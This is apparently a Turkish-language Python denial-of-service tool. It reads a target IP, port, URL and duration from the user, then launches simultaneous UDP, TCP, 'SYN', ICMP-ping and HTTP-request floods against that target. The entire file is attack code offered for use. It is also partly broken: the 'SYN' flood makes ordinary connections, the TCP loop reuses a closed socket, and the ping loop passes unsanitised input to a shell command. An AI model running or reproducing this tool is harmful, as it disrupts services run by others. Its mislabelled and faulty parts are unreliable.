import socket
import random
import time
import threading
import os
import requests


def udp_flood(hedef_ip, hedef_port, sure):
    print("\nUDP Flood saldırısı başlatılıyor")
    bitis_zamani = time.time() + sure
    soket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    veri_paketi = random._urandom(1024 * 64)  
    gonderilen_paket_sayisi = 0

    while time.time() < bitis_zamani:
        soket.sendto(veri_paketi, (hedef_ip, hedef_port))
        gonderilen_paket_sayisi += 1
        print(f"[UDP] {gonderilen_paket_sayisi}. paket {hedef_ip}:{hedef_port} gönderildi")


def tcp_flood(hedef_ip, hedef_port, sure):
    print("\nTCP Flood saldırısı başlatılıyor")
    bitis_zamani = time.time() + sure
    soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    gonderilen_paket_sayisi = 0

    while time.time() < bitis_zamani:
        soket.connect((hedef_ip, hedef_port))
        soket.sendto(random._urandom(1024), (hedef_ip, hedef_port))
        gonderilen_paket_sayisi += 1
        print(f"[TCP] {gonderilen_paket_sayisi}. paket {hedef_ip}:{hedef_port} gönderildi")
        soket.close()


def syn_flood(hedef_ip, hedef_port, sure):
    print("\nSYN saldırısı başlatılıyor")
    bitis_zamani = time.time() + sure
    soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    gonderilen_paket_sayisi = 0

    while time.time() < bitis_zamani:
        soket.connect((hedef_ip, hedef_port))
        soket.sendto(random._urandom(1024), (hedef_ip, hedef_port)) 
        gonderilen_paket_sayisi += 1
        print(f"[SYN] {gonderilen_paket_sayisi}. paket {hedef_ip}:{hedef_port} gönderildi")


def icmp_flood(hedef_ip, sure):
    print("\nICMPsaldırısı başlatılıyor")
    bitis_zamani = time.time() + sure

    while time.time() < bitis_zamani:
        os.system(f"ping -c 1 {hedef_ip}") 
        print(f"[ICMP] Ping hedefe gönderildi: {hedef_ip}")


def http_flood(hedef_url, sure):
    print("\nHTTP Flood saldırısı başlatılıyor...")
    bitis_zamani = time.time() + sure
    gonderilen_paket_sayisi = 0

    while time.time() < bitis_zamani:
        response = requests.get(hedef_url) 
        gonderilen_paket_sayisi += 1
        print(f"[HTTP] {gonderilen_paket_sayisi}. HTTP isteği gönderildi: {hedef_url}")


def main():
    baba = "cluster" 
    print(f"{baba} denemesidir \n")

    hedef_ip = input("Hedef IP Adresi: ")
    hedef_port = int(input("Hedef Port Numarası: "))
    hedef_url = input("Hedef URL (HTTP Flood için): ")
    sure = int(input("Saldırı Süresi (saniye): "))

    
    threads = []

   
    udp_thread = threading.Thread(target=udp_flood, args=(hedef_ip, hedef_port, sure))
    udp_thread.start()
    threads.append(udp_thread)

    
    tcp_thread = threading.Thread(target=tcp_flood, args=(hedef_ip, hedef_port, sure))
    tcp_thread.start()
    threads.append(tcp_thread)

    
    syn_thread = threading.Thread(target=syn_flood, args=(hedef_ip, hedef_port, sure))
    syn_thread.start()
    threads.append(syn_thread)

    
    icmp_thread = threading.Thread(target=icmp_flood, args=(hedef_ip, sure))
    icmp_thread.start()
    threads.append(icmp_thread)

    
    http_thread = threading.Thread(target=http_flood, args=(hedef_url, sure))
    http_thread.start()
    threads.append(http_thread)

    for thread in threads:
        thread.join()

    print("\n bitti")

if __name__ == "__main__":
    main()
